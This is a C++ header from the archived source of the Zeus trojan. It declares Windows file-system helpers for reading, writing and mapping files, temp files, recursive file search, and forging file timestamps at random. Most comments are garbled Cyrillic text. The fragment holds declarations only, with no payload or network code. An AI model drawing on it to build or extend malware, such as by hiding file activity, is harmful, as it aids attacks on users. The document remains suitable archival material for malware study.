/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
/*
  ����������� ��� ������ � �������� ��������.
*/

#if !defined FS_ALLOW_FILEMAPPING
#  error FS_ALLOW_FILEMAPPING not defined!
#endif

namespace Fs
{
  //Flags for _fileToMem
  enum
  {
#   if(FS_ALLOW_FILEMAPPING > 0)
    FTOMF_WRITE_ACCESS = 0x1, //Open file for writing.
#   endif
    FTOMF_SHARE_WRITE  = 0x2, //Open the file, even if it is something open for writing.
  };

  enum
  {
    FFFLAG_RECURSIVE      = 0x1, //Rekrusivny search.
    FFFLAG_SEARCH_FOLDERS = 0x2, //Search directories.
    FFFLAG_SEARCH_FILES   = 0x4, //Search files.
  };

  //Data about the image file in memory, the limit of 4Gb.
  typedef struct
  {
    LPBYTE data; //The contents of the file.
    SIZE_T size; //The size of the data.
    HANDLE file; //File handle.
#   if(FS_ALLOW_FILEMAPPING > 0)
    HANDLE map;  //The handle of the image.
#   endif
  }MEMFILE;

  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ���������� ������ � ����.

    IN fileName - ���� ��� ������.
    IN data     - ������ ��� ������, ����� ���� NULL.
    IN dataSize - ������ ������ ��� ������, ����� ���� 0.

    Return      - true - � ������ ������,
                  false - � ������ ������.
  */
  bool _saveToFile(const LPWSTR fileName, const void *data, DWORD dataSize);

  /*
    ������ ������ ����� � �����.

    IN fileName   - ���� ��� ��������.
    OUT buffer    - �����.
    IN bufferSize - ������ ������.

    Return        - ���. ���������� ����, ��� (DWORD)-1 � ������ ������.
  */
  DWORD _readFileToBuffer(const LPWSTR fileName, void *buffer, DWORD bufferSize);

  /*
    ������� ����� ����� � ������.

    IN fileName - ���� ��� ��������.
    OUT mem     - ������ �� ������ �����, �������� ������ ���� ����������� ����� CloseMemFile.
    IN flags    - ����� FTOMF_*.

    Return      - true - � ������ �������� �������� ������,
                  false - � ������ ������, ��� ������� ����� ����� 4Gb.
  */
  bool _fileToMem(LPWSTR fileName, MEMFILE *mem, DWORD flags);

  /*
    ��������� ���� �������� FileToMem.

    IN mem - ���� ��� ��������.
  */
  void _closeMemFile(MEMFILE *mem);

  /*
    ���������� ��� SetFilePointerEx ��� ��������� ������� � �����.
    
    IN file           - ����� �����.
    IN distanceToMove - ��������� ��� �����������, ����� ���� ������������� �����.
    IN moveMethod     - ������ �����������: FILE_BEGIN, FILE_CURRENT, FILE_END.

    Return            - true - � ������ ������,
                        false - � ������ ������.
  */
  bool _setFilePointer(HANDLE file, DWORD64 distanceToMove, DWORD moveMethod);

  /*
    ���������� ��� SetFilePointerEx ��� ��������� ������� ������� � �����.

    IN file - ����� �����.

    Return - ������� � ����� ��� (DWORD64)(-1) � ������ ������.
  */
  DWORD64 _getFilePointer(HANDLE file);

  /*
    ��������� ������� �����.

    IN file - ����� �����.

    Return  - ������ ����� ��� (DWORD64)(-1) � ������ ������.
  */
  DWORD64 _getFileSize(HANDLE file);

  /*
    ��������� ������� �����.

    IN file - ���� �����.

    Return  - ������ ����� ��� (DWORD64)(-1) � ������ ������.
  */
  DWORD64 _getFileSizeEx(LPWSTR file);

  /*
    �������� ����� � ��������������� ������� ���������.

    IN file - ��� �����.

    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool _removeFile(LPWSTR file);

  /*
    �������� ���������� ����� � %TEMP%.

    IN prefix  - ������� � ����� ����� (�� ����� 3-x ��������), ��� NULL ��� �������� ��
                 ���������.
    OUT buffer - ����� ��� ������� ����� �����, ������ ������ ������ ���� �� ����� MAX_PATH.

    Return     - true - � ������ ������,
                 false - � ������ ������.
  */
  bool _createTempFile(const LPWSTR prefix, LPWSTR buffer);

  /*
    �������� ���������� ����� � %TEMP% (����� ������� �������, ����� ��������� ������������� Crypt).

    IN prefix    - ������� � ����� ����� (�� ����� 3-x ��������), ��� NULL ��� �������� ��
                   ���������.
    IN extension - ���������� ����� (��� �����), �� ����� ���� NULL.
    OUT buffer   - ����� ��� ������� ����� �����, ������ ������ ������ ���� �� ����� MAX_PATH.

    Return       - true - � ������ ������,
                   false - � ������ ������.
  */
  bool _createTempFileEx(const LPWSTR prefix, const LPWSTR extension, LPWSTR buffer);

  /*
    �������� ��������� ����� � %TEMP%.

    IN prefix    - ������� � ����� ����� (�� ����� 3-x ��������), ��� NULL ��� �������� ��
                   ���������.
    OUT buffer   - ����� ��� ������� ����� �����, ������ ������ ������ ���� �� ����� MAX_PATH.

    Return       - true - � ������ ������,
                   false - � ������ ������.
  */
  bool _createTempDirectory(const LPWSTR prefix, LPWSTR buffer);
    
  /*
    ���������� �������� �� ��� '..' ��� '.'.

    IN name - ��� ��� ��������.

    Return  - true - ���� ��������,
              false - ���� �� �������.
  */
  bool _isDotsName(LPWSTR name);

  /*
    ������ � ���� ������ � ������� [DWORD:dwDataSize][BYTE[dwDataSize]].

    IN file     - ������ � ������� ���� ������������� ������.
    IN data     - ������ ��� ������.
    IN dataSize - ������ ������.

    Return      - true - � ������ ������ ������ ������,
                  false - � ������ ������, ��� ��� �������� ��������� ����� �������� �� �����, ��
                  ��� ��� ������ ����� �� ����� ������������, ���� ������ ������ ��� �� ��������
                  �� ��� ���������.
  */
  bool _writeSizeAndData(HANDLE file, void *data, DWORD dataSize);

  /*
    ��������� ��� ReadFile �� ���������� ��������� ����������� ��������.

    IN hFile                 - ����� �����.
    OUT pBuffer              - ������.
    IN dwNumberOfBytesToRead - ���������� ���� ��� ������.
    OUT pdwNumberOfBytesRead - ���������� ���������� ����, ��� 0 ���� ��� ������ ���������.
    IN hOverlappedEvent      - ������� �������� �������� ����������� I/O.

    Return                   - true - � ������ ��������� ������,
                               false - � ������ ������.
  */
  bool _ReadFile(HANDLE hFile, void *pBuffer, DWORD dwNumberOfBytesToRead, LPDWORD pdwNumberOfBytesRead, HANDLE hOverlappedEvent);

  /*
    ��������� ��� WriteFile �� ���������� ��������� ����������� ��������.

    IN hFile                    - ����� �����.
    IN pBuffer                  - ������.
    IN dwNumberOfBytesToWrite   - ���������� ���� ��� ������.
    OUT pdwNumberOfBytesWritten - ���������� ���������� ����, ��� 0 ���� ��� ������ ���������.
    IN hOverlappedEvent         - ������� �������� �������� ����������� I/O.

    Return                      - true - � ������ ��������� ������,
                                  false - � ������ ������.
  */
  bool _WriteFile(HANDLE hFile, void *pBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD pdwNumberOfBytesWritten, HANDLE hOverlappedEvent);

  /*
    ����� ������������ ������ � ����.

    IN hFile      - ����� �����.
    IN pstrFormat - ������-������ ������.
    IN ...        - ��������� ��� ������.
    
    Return        - true - � ������ �����,
                    false - � ������ ������.
  */
  bool _WriteFileFormatA(HANDLE hFile, LPSTR pstrFormat, ...);

  /*
    ��������� ������� ��� ����� ��� �����.

    IN isDir          - true - ���� pstrFile - ��� ����������, false - ���� ����.
    IN file           - ���� ��� ����� ��� ���������.
    IN creationTime   - ����� ��������, ����� ���� NULL.
    IN lastAccessTime - ����� ���������� �������, ����� ���� NULL.
    IN lastWriteTime  - ����� ��������� �����������, ����� ���� NULL.

    Return            - true - � ������ �����,
                        false - � ������ ������.
  */
  bool _setFileTime(bool isDir, LPWSTR file, FILETIME *creationTime, FILETIME *lastAccessTime, FILETIME *lastWriteTime);

  /*
    ��������� ����������� ������� ��� ����� � ��� ��������� �� startTime �� �������� ������� �����
    reservedSeconds.

    IN startTime       - ����� ������������� �������� ����� ����������� ���������.
    IN reservedSeconds - ���������������� �������, �� �������� ������� ������� ������ ������������.
    IN file            - ���� ��� ����� ��� ���������. ������ �� ������ ��������� �� ����.
    IN upLevel         - ������������ ������� ����� ��� ���������. 0 - ������ file.

    Return             - true - � ������ ������,
                         false - � ������ ������, ��� ���� ������ ������ ������� �� �������
                         ��������� ������
  */
  bool _setRandomFileTime(DWORD startTime, DWORD reservedSeconds, LPWSTR fileName, DWORD upLevel);

  /*
    ��������� ������� ��� ����� ��� �����.

    IN isDir          - true - ���� pstrFile - ��� ����������, false - ���� ����.
    IN file           - ���� ��� ����� ��� ���������.
    IN creationTime   - ����� ��������, ����� ���� NULL.
    IN lastAccessTime - ����� ���������� �������, ����� ���� NULL.
    IN lastWriteTime  - ����� ��������� �����������, ����� ���� NULL.

    Return            - true - � ������ �����,
                        false - � ������ ������.
  */
  bool _getFileTime(bool isDir, LPWSTR file, FILETIME *creationTime, FILETIME *lastAccessTime, FILETIME *lastWriteTime);

  /*
    ����������� ������� �����.
    
    IN sourceIsDir - true - ���� sourceFile - ��� ����������, false - ���� ����.
    IN sourceFile  - �������� ���� ��� �����.
    IN destIsDir   - true - ���� destFile - ��� ����������, false - ���� ����.
    IN destFile    - �������� ���� ��� �����.

    Return         - true - � ������ �����,
                     false - � ������ ������.
  */
  bool _copyFileTime(bool sourceIsDir, LPWSTR sourceFile, bool destIsDir, LPWSTR destFile);

  /*
    �������� ������ ���������.

    IN path               - ������ ���� ��� ��������. �� ������� ������ ������ ���� ������ ��
                            ������.
    IN securityAttributes - ��. CreateDirectory, ��� ������ ������ ����������� ���������
                             ����������� ��� ���������, ����� ���� NULL.

    Return                - true - � ������ ������,
                            false - � ������ ������.
  */
  bool _createDirectoryTree(LPWSTR path, LPSECURITY_ATTRIBUTES securityAttributes);

  /*
    �������� ������ ���������.

    IN path - ���� ��� ��������.

    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool _removeDirectoryTree(LPWSTR path);

  /*
    ������� ��� ������� _findFiles.

    IN path     - ���� �� �������� ������ ����. ����� ������������ �� ����!
    IN fileInfo - ������ �����.
    IN data     - ����������� ������.

    Return      - true - ���������� �����,
                  false - ���������� �����.
  */
  typedef bool (FINDFILEPROC)(const LPWSTR path, const WIN32_FIND_DATAW *fileInfo, void *data);
  
  /*
    ����� ������ � ����������.

    IN path           - ����������.
    IN fileMasks      - ������ ����� ��� ������.
    IN fileMasksCount - ���. ��������� � fileMasks.
    IN flags          - ����� FFFLAG_*.
    IN findFileProc   - ������� ���������� ��� ������� ��������� �����.
    IN data           - ����������� ������.
    IN stopEvent      - ������� ���������� ������, ��� NULL.
    IN subfolderDelay - �������� ����� ������� � �������������.
    IN foundedDelay   - �������� ����� ������ findFileProc.
  */
  void _findFiles(LPWSTR path, const LPWSTR *fileMasks, DWORD fileMasksCount, DWORD flags, FINDFILEPROC findFileProc, void *data, HANDLE stopEvent, DWORD subfolderDelay, DWORD foundedDelay);

  /*
    ������� ������� � ������� ���������� ��������� �� �� ��������.

    IN path    - ���� ��� ���������.
    OUT buffer - ������������ ����. ����� ������ ���� �� ����� MAX_PATH.

    Return     - true - � ������ �����,
                 false - � ������ ������.
  */
  bool _unquoteAndExpandPath(LPWSTR path, LPWSTR buffer);

  /*
    ���������� ��� PathCombibeW, ������� ��������� �� ����� ����������� ������ �������.

    OUT dest - �����.
    IN dir   - ������ ����� ����.
    IN file  - ������ ����� ����.

    Return   - true - � ������ �����,
               false - � ������ ������.
  */
  bool _pathCombine(LPWSTR dest, const LPWSTR dir, const LPWSTR file);

  /*
    ����������� / � \.

    IN OUT path - ����.
  */
  void _normalizeSlashes(LPWSTR path);

  /*    Replacement of slashes on a character.

    IN OUT string - string to process.
    IN c - the new symbol.
  */
  void _replaceSlashes(LPWSTR string, WCHAR c);
};
